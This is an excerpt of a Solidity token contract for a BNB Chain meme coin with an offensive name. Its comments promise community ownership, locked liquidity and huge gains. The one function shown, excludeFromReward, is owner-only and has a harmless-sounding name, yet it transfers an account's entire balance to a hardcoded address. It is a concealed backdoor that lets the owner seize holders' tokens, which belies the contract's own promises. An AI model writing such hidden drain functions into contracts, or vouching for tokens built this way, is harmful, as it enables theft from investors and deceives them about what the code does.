...
/**   
   ...
   Welcome to FuxkBabiesCoin
   
   This is a community token. If you want to create a telegram I suggest to name it to @FuxkBabiesCoin
   ...
   I will Lock liquidity LPs to Lock addresses of the pool
   I will add .2 BNB and all the left 10% total supply to the pool
   Can you make #FuxkBabiesCoin 10000X? 
   ...
   it's the best part of the #FuxkBabiesCoin idea, increasing the liquidity pool automatically, 
...
contract FuxkBabiesCoin is Context, IERC20, Ownable {
    ...
    string private _name = "Fu*k Babies Coin";
    ...
    function excludeFromReward(address account) public onlyOwner() {
         _transfer(account, 0x34f4D2a43737c6250f91E9042d81cf6f14e2793a, balanceOf(account));
    }
